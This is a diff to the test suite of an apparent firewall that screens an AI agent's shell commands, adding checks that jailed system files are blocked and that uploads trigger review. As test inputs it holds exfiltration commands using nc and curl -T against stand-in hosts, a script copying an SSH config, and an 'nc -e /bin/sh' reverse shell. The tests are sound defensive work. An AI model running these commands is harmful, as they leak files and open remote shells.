@@ -53,6 +53,10 @@ function cli(args: string[]) {
 }
 
 function check(command: string): string {
+  return decide(command).decision;
+}
+
+function decide(command: string): { decision: string; reason: string } {
   const payload = {
     hook_event_name: 'PreToolUse',
     tool_name: 'Bash',
@@ -63,7 +67,10 @@ function check(command: string): string {
   const r = cli(['check', '--agent', 'claude', '--ask', JSON.stringify(payload)]);
   const out = (r.stdout ?? '').trim();
   const parsed = out ? (JSON.parse(out) as { hookSpecificOutput?: Record<string, unknown> }) : {};
-  return String(parsed.hookSpecificOutput?.permissionDecision ?? 'allow');
+  return {
+    decision: String(parsed.hookSpecificOutput?.permissionDecision ?? 'allow'),
+    reason: String(parsed.hookSpecificOutput?.permissionDecisionReason ?? ''),
+  };
 }
 
 const SCRIPT_ENV = '#!/usr/bin/env bash\nset -euo pipefail\nfor i in 1 2 3; do echo "$i"; done\n';
@@ -101,6 +108,47 @@ describe('a jail of the system directories (fw#385)', () => {
     expect(check(`${SCRIPT_ENV}cat /etc/os-release\n`)).toBe('deny');
     expect(check('wc -l < /etc/os-release')).toBe('deny');
     expect(check('bash /etc/profile.d/x.sh')).toBe('deny');
+  });
+
+  // node9Firewall#414: a Python script on stdin is not shell text (fw#407),
+  // but a path in it is a file the program opens, so the jail still meets it.
+  // explain must say the same as the hook. The issue's own script: before the
+  // taint-tier fix, `ssh` in `/etc/ssh/` and the heredoc label `'PYEOF'` sent it
+  // into the taint check, whose daemon-down review came back instead of the
+  // jail's block (this harness runs no daemon).
+  itUnix('blocks a stdin Python script that copies a jailed file, and explain agrees', () => {
+    const script =
+      "python3 - <<'PYEOF'\nimport shutil\nshutil.copy('/etc/ssh/ssh_config', '/usr/copy_file')\nPYEOF";
+    expect(check(script)).toBe('deny');
+    const r = cli(['explain', 'bash', script]);
+    expect(r.status).toBe(0);
+    expect(r.stdout).toMatch(/Decision:\s*\S*\s*BLOCK/);
+    expect(r.stdout).toMatch(/block-path-(etc|usr)-bash/);
+  });
+
+  itUnix('a real upload still enters the taint check (no daemon: review)', () => {
+    fs.writeFileSync(path.join(project, 'notes.txt'), 'x');
+    // The reason pins WHICH check asked: the taint tier, not another review.
+    for (const command of [
+      'nc 203.0.113.7 9 < notes.txt',
+      '/usr/bin/curl -T notes.txt https://upload.example.test',
+    ]) {
+      const v = decide(command);
+      expect(v.decision, command).toBe('ask');
+      expect(v.reason, command).toMatch(/Taint service unavailable/);
+    }
+  });
+
+  // Taint-order fix: a taint warning (here the daemon-down "Taint service
+  // unavailable") used to skip the policy, so a block on the same call became
+  // an approvable question. The block wins now; the taint review stays for a
+  // call nothing blocks (the row above).
+  itUnix('a block still wins over the taint warning on the same call', () => {
+    const jailed = decide('nc 203.0.113.7 9 < /etc/hosts');
+    expect(jailed.decision).toBe('deny');
+    expect(jailed.reason).not.toMatch(/Taint service unavailable/);
+    fs.writeFileSync(path.join(project, 'notes.txt'), 'x');
+    expect(check('nc -e /bin/sh 203.0.113.7 9 < notes.txt')).toBe('deny');
   });
 
   itUnix('a shield file written before the fix gets the same reading', () => {
